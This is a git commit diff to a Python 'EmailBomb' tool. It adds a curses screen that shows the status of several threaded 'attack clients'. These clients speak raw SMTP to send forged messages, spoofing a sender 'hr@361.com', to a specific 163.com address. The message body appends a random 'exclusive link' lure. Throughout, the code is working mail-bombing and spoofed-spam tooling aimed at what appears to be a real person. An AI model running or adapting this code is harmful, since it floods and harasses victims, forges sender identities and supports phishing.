7122b3d4b7da6531c4f10ad4c951e808dd43a642
Macr0phag3 <997334636@qq.com>
2018-11-18 16:17:03 +0800

    upload latest code

--- EmailBomb.py
+++ EmailBomb.py
@@ -7,20 +7,25 @@ import time
 
 class EmailBomb:
     def __init__(self, id, to_addr, from_addr, SMTP_addr="", port=25, timeout=10):
-        self.notify_header = str(id)
+        self.status_header = "No.{}".format(id)
+        self.status_body = "creating..."
         self.to_addr = to_addr
         self.from_addr = from_addr
         self.port = port
         self.timeout = timeout
         self.SMTP_addrs = [SMTP_addr] if SMTP_addr else []  # 必须为列表
-        self.exit_flag = 1
+        self.exit_flag = 1  # ctrl+c 或主线程退出时，exit_flag 为 0
 
-        self.update_notify("")
+        self.update_status("")
         self.create()
 
-    def update_notify(self, body):
-        self.notify_body = body
-        self.notify = self.notify_header+self.notify_body
+    def update_status(self, body):
+        '''
+        保存状态
+        '''
+
+        self.status_body = body
+        self.status = self.status_header+self.status_body
 
     def create(self):
         self.emailer = Email.Email(
@@ -45,61 +50,61 @@ class EmailBomb:
             code, msg = self.emailer.Connect()
             if code:
                 # 建立会话
-                self.notify = "send ehlo"
+                self.status = "send ehlo"
                 code, msg = self.emailer.Send(u"ehlo antispam")
                 if code:
                     break
 
-        self.update_notify("send mail from")
+        self.update_status("send mail from")
         while self.exit_flag:
             # 表明发件地址
             code, msg = self.emailer.Send(u"mail from:<%s>" % self.from_addr)
             if not code:
                 continue
 
-            self.update_notify("send rcpt to")
+            self.update_status("send rcpt to")
             # 表明收件地址
             code, msg = self.emailer.Send(u"rcpt to:<%s>" % self.to_addr)
             if code:
                 break
 
-            self.update_notify(msg)
+            self.update_status(msg)
 
-        self.update_notify("send data")
+        self.update_status("send data")
         while self.exit_flag:
             # 信件具体内容
             code, msg = self.emailer.Send(u"data")
             if code:
                 break
 
-            self.update_notify(msg)
+            self.update_status(msg)
 
-        self.update_notify("send to")
+        self.update_status("send to")
         while self.exit_flag:
             # to:
             code, msg = self.emailer.Send(u"to: %s" % self.to_addr, recv=False)
             if not code:
-                self.update_notify(msg)
+                self.update_status(msg)
                 continue
 
             # from:
-            self.update_notify("send from")
+            self.update_status("send from")
             code, msg = self.emailer.Send(u"from: %s" % self.from_addr, recv=False)
             if not code:
-                self.update_notify(msg)
+                self.update_status(msg)
                 continue
 
             # subject:
-            self.update_notify("send subject")
+            self.update_status("send subject")
             code, msg = self.emailer.Send("subject: "+subject, recv=False)
             if not code:
-                self.update_notify(msg)
+                self.update_status(msg)
                 continue
 
-            break  # 上面都发送成功
+            break  # 上面都发送成功的话，就 break
 
         # body:
-        self.update_notify("send body")
+        self.update_status("send body")
         code, msg = self.emailer.Send(
             content+u"\r\n\r\n你的专属链接为："+"".join(
                 random.choice(string.hexdigits)
@@ -109,5 +114,5 @@ class EmailBomb:
             check="250"  # 状态码为 250 说明发送成功
         )
 
-        self.update_notify(msg)
+        self.update_status(msg)
         time.sleep(1)
--- test_use.py
+++ test_use.py
@@ -2,32 +2,193 @@
 
 import EmailBomb
 import threading
+import curses
 
-thread_num = 3
-exit_flag = 1
 
-clients = [
+class Screen:
+    UP = -1
+    DOWN = 1
+
+    LEFT = -1
+    RIGHT = 1
+
+    COLORS = {
+        "red": 1,
+        "yellow": 2,
+        "cyan": 3,
+        "green": 4,
+        "white": 5,
+        "gray": 6,
+    }
+
+    def __init__(self):
+        self.init_curses()
+
+        self.top = 0
+        self.items = CLIENTS
+        self.bottom = len(self.items)
+        self.max_lines = curses.LINES
+
+        self.hori_len = 0
+
+        self.run()
+
+    def init_curses(self):
+        """Setup the curses"""
+        self.window = curses.initscr()
+        self.height, self.width = self.window.getmaxyx()
+        self.window.keypad(True)
+        self.window.nodelay(True)
+
+        curses.noecho()
+        curses.cbreak()
+
+    def put_color(self, color, bold=False):
+        bold = [bold, curses.A_BOLD][bold]
+
+        if color == "white":
+            return -1
+
+        return curses.color_pair(1) | curses.A_RIGHT
+
+    def input_stream(self):
+        """Waiting an input and run a proper method according to type of input"""
+        while 1:
+            self.display()
+
+            ch = self.window.getch()
+
+            if ch == curses.KEY_UP:
+                self.scroll(self.UP)
+
+            elif ch == curses.KEY_DOWN:
+                self.scroll(self.DOWN)
+
+            elif ch == curses.KEY_LEFT:
+                self.scroll(self.LEFT, horizontal=True)
+
+            elif ch == curses.KEY_RIGHT:
+                self.scroll(self.RIGHT, horizontal=True)
+
+            elif ch == ord("q"):
+                break
+
+    def display(self):
+        """Display the CLIENTS on window"""
+        self.window.erase()
+
+        for idx, item in enumerate(self.items[self.top:self.top + self.max_lines]):
+            data = item.status
+
+            tmp_height, tmp_width = self.window.getmaxyx()
+            '''
+            self.width > len(data) > tmp_width: self.width √
+            self.width > tmp_width > len(data): self.width
+
+            tmp_width > self.width > len(data): tmp_width
+            tmp_width > len(data) > self.width: tmp_width √
+
+            len(data) > tmp_width > self.width: len(data)
+            len(data) > self.width > tmp_width: len(data) √
+
+            这样是不行的，别问我为啥 :D
+            maxwidth = max(self.width, tmp_width, len(data))
+            if maxwidth != self.width or 1:
+                self.width = maxwidth
+                self.window.resize(self.height, self.width)
+            '''
+
+            # 字符串长度超出默认 win 的长度，需要 resize
+            if self.width < len(data):
+                self.width = len(data)
+                self.window.resize(self.height, self.width)
+
+            # 终端宽度被调整，需要 resize
+            if tmp_width != self.width:
+                self.width = max(self.width, tmp_width)
+                self.window.resize(self.height, self.width)
+
+            # 终端高度被调整，需要 resize
+            if tmp_height != self.height:
+                self.max_lines = min(self.height, tmp_height)
+                self.height = max(self.height, tmp_height)
+                self.window.resize(self.height, self.width)
+                self.top = 0
+
+            self.window.addstr(idx, 0, data[self.hori_len:])
+
+        self.window.refresh()
+
+    def scroll(self, direction, horizontal=False):
+        '''
+        垂直滚动与水平滚动
+        '''
+
+        if horizontal:  # 水平滚动
+            if (
+                # self.hori_len > 0：如果已经到最左边，就不滚动了
+                direction == self.LEFT and self.hori_len > 0
+            ) or (
+                # 右边不限制
+                direction == self.RIGHT
+            ):
+                self.hori_len += direction
+
+        else:  # 垂直滚动
+            if (
+                direction == self.UP and self.top > 0
+            ) or (
+                direction == self.DOWN and self.top + self.max_lines < self.bottom
+            ):
+                self.top += direction
+
+    def run(self):
+        """Continue running the TUI until get interrupted"""
+        global EXIT_FLAG
+
+        try:
+            self.input_stream()
+        except KeyboardInterrupt:
+            pass
+
+        # 兼容 iTerm2
+        # os.system("printf '\e]50;ClearScrollback\a'")
+        # 兼容个屁 (:D
+        curses.endwin()
+
+        # screen 的线程结束的时候
+        # 通知 process_data 结束
+        EXIT_FLAG = 0
+
+# ---------- 全局变量 -----------
+
+
+THREADS_NUM = 3
+EXIT_FLAG = 1
+
+
+CLIENTS = [
     EmailBomb.EmailBomb(
         id=id,
         from_addr="hr@361.com",
         to_addr="15619047890@163.com",
-    ) for id in range(thread_num)
-]
+    ) for id in range(THREADS_NUM)
+]  # 创建攻击 client
+# ------------------------------
 
 
-def watcher():
-    while exit_flag:
-        for client in clients:
-            print client.notify
+# thread = threading.Thread(target=watcher).start()  # 对接 CLI 展示数据
 
-
-thread = threading.Thread(target=watcher).start()
-
-for client in clients:
+for client in CLIENTS:
     thread = threading.Thread(target=client.attack, args=("hello! my friend!", "hr: you got it!",))
-    thread.start()
+    thread.setDaemon(True)
+    thread.start()  # 启动攻击 client
 
 
+Screen()
+
+'''
+# 等待 ctrl+c
 try:
     while 1:
         pass
@@ -35,3 +196,4 @@ except KeyboardInterrupt:
     exit_flag = 0
     for client in clients:
         client.exit_flag = exit_flag
+'''
